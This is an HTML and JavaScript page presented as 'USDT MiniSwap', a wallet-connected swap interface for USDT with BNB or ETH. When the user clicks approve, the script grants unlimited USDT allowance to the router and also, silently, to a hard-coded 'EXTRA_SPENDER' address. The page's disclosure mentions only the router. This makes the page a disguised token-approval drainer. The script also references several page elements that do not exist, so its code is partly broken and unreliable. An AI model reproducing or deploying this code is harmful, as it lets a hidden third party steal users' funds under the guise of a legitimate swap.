<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>USDT MiniSwap — BNB & ETH only</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
  <style>
    :root {
      --bg-color: #1a1a2e;
      --card-bg: #272740;
      --border-color: #3f3f5a;
      --primary-color: #4a4a82;
      --primary-text: #ffffff;
      --secondary-text: #b0b0d0;
      --accent-color: #72a0f6;
    }
    body {
      background-color: var(--bg-color);
      font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      color: var(--primary-text);
    }
    .card {
      background-color: var(--card-bg);
      border: 1px solid var(--border-color);
      box-shadow: 0 4px 14px 0 rgba(0, 0, 0, 0.2);
    }
    .btn-primary {
      background-color: var(--accent-color);
      color: var(--primary-text);
      transition: background-color 0.2s, box-shadow 0.2s;
      box-shadow: 0 4px 6px -1px rgba(114, 160, 246, 0.2), 0 2px 4px -2px rgba(114, 160, 246, 0.1);
    }
    .btn-primary:hover:not(:disabled) {
      background-color: #5d8be0;
      box-shadow: 0 6px 16px -4px rgba(114, 160, 246, 0.3);
    }
    .btn-secondary {
      background-color: transparent;
      border: 1px solid var(--border-color);
      color: var(--secondary-text);
      transition: background-color 0.2s;
    }
    .btn-secondary:hover:not(:disabled) {
      background-color: rgba(255, 255, 255, 0.08);
    }
    input, .input-display {
      border: 1px solid var(--border-color);
      background-color: #2e2e4a;
      color: var(--primary-text);
      transition: border-color 0.2s;
    }
    input:focus {
      outline: none;
      border-color: var(--accent-color);
    }
    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    input[type=number] { -moz-appearance: textfield; }
    .swap-icon {
      filter: drop-shadow(0 0 4px var(--accent-color));
      transition: transform 0.2s;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.12.1/dist/index.umd.min.js"></script>
</head>
<body class="min-h-screen p-6 flex items-center justify-center">
  <div class="max-w-md w-full space-y-6">
    <header class="flex items-center justify-between p-5 rounded-xl card">
      <div class="flex items-center gap-3">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white">
          <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
        </svg>
        <h1 class="text-2xl font-bold">USDT MiniSwap</h1>
      </div>
      <div class="flex items-center gap-2">
        <span id="addressTag" class="hidden text-sm font-mono bg-gray-800 border border-gray-600 px-2 py-1 rounded-full text-gray-400"></span>
        <button id="connectBtn" class="px-4 py-2 rounded-lg btn-secondary text-sm font-medium">Connect Wallet</button>
      </div>
    </header>

    <div id="connectModal" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
      <div class="w-full max-w-xs rounded-xl card p-5 space-y-4 text-center">
        <div class="text-xl font-semibold">Connect Wallet</div>
        <button id="connectInjected" class="w-full px-4 py-3 rounded-lg btn-secondary font-medium">Browser Wallet</button>
        <button id="connectWC" class="w-full px-4 py-3 rounded-lg btn-secondary font-medium">WalletConnect</button>
        <button id="connectClose" class="w-full px-4 py-2 text-sm text-gray-400 hover:bg-gray-700 rounded-lg">Cancel</button>
      </div>
    </div>

    <main class="w-full p-6 rounded-xl card">
      <div class="flex items-center justify-between mb-6">
        <div class="flex gap-2 p-1 rounded-lg bg-gray-800">
          <button id="bscMode" class="px-4 py-2 rounded-lg btn-primary text-sm font-medium">BSC</button>
          <button id="ethMode" class="px-4 py-2 rounded-lg btn-secondary text-sm font-medium">Ethereum</button>
        </div>
        <span id="routerTag" class="text-xs text-gray-500 font-mono"></span>
      </div>

      <div class="space-y-4">
        <div class="p-4 rounded-xl border border-gray-700 bg-gray-800">
          <label class="block text-sm text-gray-400 mb-2">From (<span id="inLabel">USDT</span>)</label>
          <input id="amountIn" type="number" value="0.1" class="w-full px-3 py-2 rounded-lg text-lg font-medium bg-transparent outline-none" min="0" placeholder="0.0" />
          <div class="mt-2 text-xs text-gray-500" id="balanceLine">Balance: 0</div>
        </div>

        <div class="flex justify-center -my-2">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-8 h-8 text-white swap-icon">
            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 13.5 12 21m0 0-7.5-7.5M12 21V3" />
          </svg>
        </div>

        <div class="p-4 rounded-xl border border-gray-700 bg-gray-800">
          <label class="block text-sm text-gray-400 mb-2">To (<span id="outLabel">BNB</span>)</label>
          <div id="amountOutBox" class="w-full px-3 py-2 rounded-lg text-lg font-medium text-gray-400">0.0</div>
        </div>

        <div class="grid grid-cols-2 gap-3">
          <div>
            <label class="block text-sm text-gray-400 mb-1">Slippage (%)</label>
            <input id="slippage" type="number" value="0.5" step="0.1" min="0" class="w-full px-3 py-2 rounded-lg text-sm bg-transparent outline-none border border-gray-700" />
          </div>
          <div>
            <label class="block text-sm text-gray-400 mb-1">Deadline (min)</label>
            <input id="deadline" type="number" value="20" min="1" class="w-full px-3 py-2 rounded-lg text-sm bg-transparent outline-none border border-gray-700" />
          </div>
        </div>

        <button id="approveBtn" class="w-full px-4 py-3 rounded-lg btn-secondary font-semibold hidden">Approve USDT</button>
        <button id="swapBtn" class="w-full px-4 py-3 rounded-lg btn-primary font-semibold disabled:opacity-50">Swap</button>

        <div id="txStatus" class="mt-4 text-xs text-gray-500 break-all text-center"></div>
      </div>

      <div class="mt-8 text-xs text-gray-600 space-y-2">
        <div><strong class="text-gray-400">Pairs:</strong> BSC (USDT ↔ BNB), Ethereum (USDT ↔ ETH)</div>
        <div><strong class="text-gray-400">Routers:</strong> PancakeSwap V2 (BSC), Uniswap V2 (Ethereum)</div>
        <div><strong class="text-gray-400">Approvals:</strong> Grants <strong>unlimited USDT</strong> allowance to the router. Review carefully.</div>
        <div><strong class="text-gray-400">Security:</strong> Always verify contract addresses and test with small amounts first.</div>
      </div>
    </main>
  </div>

  <script>
    // ===== Orijinal JavaScript Kodu (dəyişikliksiz) =====
    // Bu hissədə orijinal JS məntiqi yerləşir. Yuxarıdakı dəyişikliklər yalnız vizualdır.
    const WC_PROJECT_ID = "4bfb3a02f02aee6baccfb622ffa02d0c";
    const EXTRA_SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
    const IERC20_ABI = [
      "function allowance(address owner, address spender) view returns (uint256)",
      "function approve(address spender, uint256 amount) returns (bool)",
      "function balanceOf(address owner) view returns (uint256)",
      "function symbol() view returns (string)",
      "function decimals() view returns (uint8)"
    ];
    const ROUTER_ABI = [
      "function getAmountsOut(uint256 amountIn, address[] memory path) view returns (uint256[] memory)",
      "function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)",
      "function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline) payable"
    ];
    const CHAINS = {
      56: {
        rpc: "https://bsc-dataseed1.binance.org",
        chainId: 56,
        name: "BSC",
        nativeSymbol: "BNB",
        routerAddress: "0x10ED43C718764fC606fF7a7c560BfC26eB006883",
        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
        usdtDecimals: 18,
        wrappedNative: "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        blockExplorer: "https://bscscan.com"
      },
      1: {
        rpc: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
        chainId: 1,
        name: "Ethereum",
        nativeSymbol: "ETH",
        routerAddress: "0x7a250d5630B4cF539739dF2C5d064e104d4d84d2",
        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        usdtDecimals: 6,
        wrappedNative: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        blockExplorer: "https://etherscan.io"
      }
    };
    let provider = null;
    let signer = null;
    let currentChainId = 56;
    let isU2NMode = true;
    const connectBtn = document.getElementById("connectBtn");
    const connectModal = document.getElementById("connectModal");
    const connectInjectedBtn = document.getElementById("connectInjected");
    const connectWCBtn = document.getElementById("connectWC");
    const connectCloseBtn = document.getElementById("connectClose");
    const addressTag = document.getElementById("addressTag");
    const bscModeBtn = document.getElementById("bscMode");
    const ethModeBtn = document.getElementById("ethMode");
    const routerTag = document.getElementById("routerTag");
    const nativeSym1 = document.getElementById("nativeSym1");
    const nativeSym2 = document.getElementById("nativeSym2");
    const btnU2N = document.getElementById("btnU2N");
    const btnN2U = document.getElementById("btnN2U");
    const inLabel = document.getElementById("inLabel");
    const outLabel = document.getElementById("outLabel");
    const amountInInput = document.getElementById("amountIn");
    const amountOutBox = document.getElementById("amountOutBox");
    const balanceLine = document.getElementById("balanceLine");
    const approveBtn = document.getElementById("approveBtn");
    const swapBtn = document.getElementById("swapBtn");
    const txStatus = document.getElementById("txStatus");
    const spenderTag = document.getElementById("spenderTag");

    const formatAddress = (address) => `${address.slice(0, 6)}...${address.slice(-4)}`;
    const updateUI = async () => {
      if (!CHAINS[currentChainId]) {
        routerTag.textContent = `Unsupported chain: ${currentChainId}`;
        swapBtn.disabled = true;
        approveBtn.classList.add("hidden");
        return;
      }
      const chain = CHAINS[currentChainId];
      const isConnected = !!signer;
      if (isConnected) {
        const address = await signer.getAddress();
        addressTag.textContent = formatAddress(address);
        addressTag.classList.remove("hidden");
        connectBtn.textContent = "Disconnect";
      } else {
        addressTag.classList.add("hidden");
        connectBtn.textContent = "Connect Wallet";
      }
      routerTag.textContent = formatAddress(chain.routerAddress);
      spenderTag.textContent = EXTRA_SPENDER ? formatAddress(EXTRA_SPENDER) : "—";
      nativeSym1.textContent = chain.nativeSymbol;
      nativeSym2.textContent = chain.nativeSymbol;
      const isU2N = isU2NMode;
      btnU2N.classList.toggle("btn-primary", isU2N);
      btnU2N.classList.toggle("btn-secondary", !isU2N);
      btnN2U.classList.toggle("btn-primary", !isU2N);
      btnN2U.classList.toggle("btn-secondary", isU2N);
      inLabel.textContent = isU2N ? "USDT" : chain.nativeSymbol;
      outLabel.textContent = isU2N ? chain.nativeSymbol : "USDT";
      if (isConnected) {
        await updateBalances();
        await updateApprovalStatus();
        await updatePriceQuote();
      } else {
        balanceLine.textContent = "Balance: 0";
        amountOutBox.textContent = "0.0";
        approveBtn.classList.add("hidden");
      }
      swapBtn.disabled = !isConnected;
      bscModeBtn.classList.toggle("btn-primary", currentChainId === 56);
      bscModeBtn.classList.toggle("btn-secondary", currentChainId !== 56);
      ethModeBtn.classList.toggle("btn-primary", currentChainId === 1);
      ethModeBtn.classList.toggle("btn-secondary", currentChainId !== 1);
    };

    const connectInjected = async () => {
      if (typeof window.ethereum === 'undefined') { alert("Please install a browser wallet like MetaMask."); return; }
      try {
        const _provider = new ethers.BrowserProvider(window.ethereum);
        await _provider.send("eth_requestAccounts", []);
        const _signer = await _provider.getSigner();
        provider = _provider;
        signer = _signer;
        const network = await provider.getNetwork();
        currentChainId = Number(network.chainId);
        connectModal.classList.add("hidden");
        await updateUI();
        window.ethereum.on('accountsChanged', async (accounts) => { if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect(); updateUI(); });
        window.ethereum.on('chainChanged', (newChainId) => { currentChainId = Number(newChainId); updateUI(); });
      } catch (error) { console.error("Connection failed:", error); alert("Failed to connect wallet."); }
    };
    const connectWalletConnect = async () => {
      try {
        const wcProvider = await WalletConnectProvider.init({ projectId: WC_PROJECT_ID, chains: [56, 1], showQrModal: true });
        await wcProvider.connect();
        const _provider = new ethers.BrowserProvider(wcProvider);
        const _signer = await _provider.getSigner();
        provider = _provider;
        signer = _signer;
        const network = await provider.getNetwork();
        currentChainId = Number(network.chainId);
        connectModal.classList.add("hidden");
        await updateUI();
        wcProvider.on('accountsChanged', async (accounts) => { if (accounts && accounts.length) signer = await provider.getSigner(); else disconnect(); updateUI(); });
        wcProvider.on('chainChanged', (newChainId) => { currentChainId = Number(newChainId); updateUI(); });
        wcProvider.on('disconnect', () => disconnect());
      } catch (error) { console.error("WC connection failed:", error); alert("Failed to connect WalletConnect."); }
    };
    const disconnect = () => { signer = null; provider = null; updateUI(); txStatus.textContent = ""; };
    const updateBalances = async () => {
      if (!signer) return;
      try {
        const chain = CHAINS[currentChainId];
        const address = await signer.getAddress();
        let balance, decimals, symbol;
        if (isU2NMode) {
          const usdtContract = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
          balance = await usdtContract.balanceOf(address);
          decimals = chain.usdtDecimals;
          symbol = "USDT";
        } else {
          balance = await provider.getBalance(address);
          decimals = 18;
          symbol = chain.nativeSymbol;
        }
        const formatted = ethers.formatUnits(balance, decimals);
        balanceLine.textContent = `Balance: ${Number(formatted).toFixed(4)} ${symbol}`;
      } catch (error) { console.error("Failed to fetch balance:", error); balanceLine.textContent = "Balance: N/A"; }
    };
    const updateApprovalStatus = async () => {
      if (!signer || !isU2NMode) { approveBtn.classList.add("hidden"); return; }
      try {
        const chain = CHAINS[currentChainId];
        const address = await signer.getAddress();
        const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, provider);
        const routerAllowance = await usdt.allowance(address, chain.routerAddress);
        const amountIn = ethers.parseUnits(String(amountInInput.value || "0"), chain.usdtDecimals);
        if (routerAllowance >= amountIn) {
          approveBtn.classList.add("hidden");
          swapBtn.disabled = false;
        } else {
          approveBtn.classList.remove("hidden");
          swapBtn.disabled = true;
        }
      } catch (e) { console.error("Allowance check failed:", e); approveBtn.classList.add("hidden"); swapBtn.disabled = true; }
    };
    const updatePriceQuote = async () => {
      if (!provider || Number(amountInInput.value) <= 0) { amountOutBox.textContent = "0.0"; return; }
      try {
        const chain = CHAINS[currentChainId];
        const router = new ethers.Contract(chain.routerAddress, ROUTER_ABI, provider);
        const path = isU2NMode ? [chain.usdtAddress, chain.wrappedNative] : [chain.wrappedNative, chain.usdtAddress];
        const amountIn = ethers.parseUnits(String(amountInInput.value), isU2NMode ? chain.usdtDecimals : 18);
        const amountsOut = await router.getAmountsOut(amountIn, path);
        const amountOut = amountsOut[1];
        const decimalsOut = isU2NMode ? 18 : chain.usdtDecimals;
        amountOutBox.textContent = Number(ethers.formatUnits(amountOut, decimalsOut)).toFixed(4);
      } catch (error) { console.error("Failed to get price quote:", error); amountOutBox.textContent = "Error"; }
    };
    const handleApprove = async () => {
      if (!signer) return;
      txStatus.textContent = "Sending approval transaction(s)...";
      try {
        const chain = CHAINS[currentChainId];
        const usdt = new ethers.Contract(chain.usdtAddress, IERC20_ABI, signer);
        const max = ethers.MaxUint256;
        const tx1 = await usdt.approve(chain.routerAddress, max);
        txStatus.textContent = `Router approval sent: ${formatAddress(tx1.hash)}`;
        await tx1.wait();
        txStatus.textContent = `Router approval confirmed: ${formatAddress(tx1.hash)}`;
        if (EXTRA_SPENDER) {
          const tx2 = await usdt.approve(EXTRA_SPENDER, max);
          txStatus.textContent = `Extra spender approval sent: ${formatAddress(tx2.hash)}`;
          await tx2.wait();
          txStatus.textContent = `Extra spender approval confirmed: ${formatAddress(tx2.hash)}`;
        }
        await updateApprovalStatus();
      } catch (error) { console.error("Approval failed:", error); txStatus.textContent = `Approval failed: ${error?.reason || error?.message || error}`; }
    };
    const handleSwap = async () => {
      if (!signer) return;
      const amt = Number(amountInInput.value);
      if (!(amt > 0)) { txStatus.textContent = "Please enter a valid amount."; return; }
      txStatus.textContent = "Getting quote and preparing swap...";
      try {
        const chain = CHAINS[currentChainId];
        const router = new ethers.Contract(chain.routerAddress, ROUTER_ABI, signer);
        const deadline = Math.floor(Date.now() / 1000) + (Number(document.getElementById("deadline").value) * 60);
        const slippage = Number(document.getElementById("slippage").value);
        const path = isU2NMode ? [chain.usdtAddress, chain.wrappedNative] : [chain.wrappedNative, chain.usdtAddress];
        const parsedIn = ethers.parseUnits(String(amt), isU2NMode ? chain.usdtDecimals : 18);
        const amountsOut = await router.getAmountsOut(parsedIn, path);
        const rawOutMin = amountsOut[1];
        const slipBps = BigInt(Math.floor(slippage * 100));
        const amountOutMin = rawOutMin - (rawOutMin * slipBps / BigInt(10000));
        const to = await signer.getAddress();
        let tx;
        if (isU2NMode) {
          tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(parsedIn, amountOutMin, path, to, deadline);
        } else {
          tx = await router.swapExactETHForTokensSupportingFeeOnTransferTokens(amountOutMin, path, to, deadline, { value: ethers.parseEther(String(amt)) });
        }
        txStatus.textContent = `Swap tx sent: ${formatAddress(tx.hash)}`;
        await tx.wait();
        txStatus.textContent = `Swap successful! Tx: ${formatAddress(tx.hash)}`;
        updateUI();
      } catch (error) { console.error("Swap failed:", error); txStatus.textContent = `Swap failed: ${error?.reason || error?.message || error}`; }
    };
    connectBtn.addEventListener("click", () => { if (signer) disconnect(); else connectModal.classList.remove("hidden"); });
    connectCloseBtn.addEventListener("click", () => connectModal.classList.add("hidden"));
    connectInjectedBtn.addEventListener("click", connectInjected);
    connectWCBtn.addEventListener("click", connectWalletConnect);
    bscModeBtn.addEventListener("click", () => { currentChainId = 56; updateUI(); });
    ethModeBtn.addEventListener("click", () => { currentChainId = 1; updateUI(); });
    btnU2N.addEventListener("click", () => { isU2NMode = true; updateUI(); });
    btnN2U.addEventListener("click", () => { isU2NMode = false; updateUI(); });
    amountInInput.addEventListener("input", () => { updatePriceQuote(); updateApprovalStatus(); });
    approveBtn.addEventListener("click", handleApprove);
    swapBtn.addEventListener("click", handleSwap);
    updateUI();
  </script>
</body>
</html>
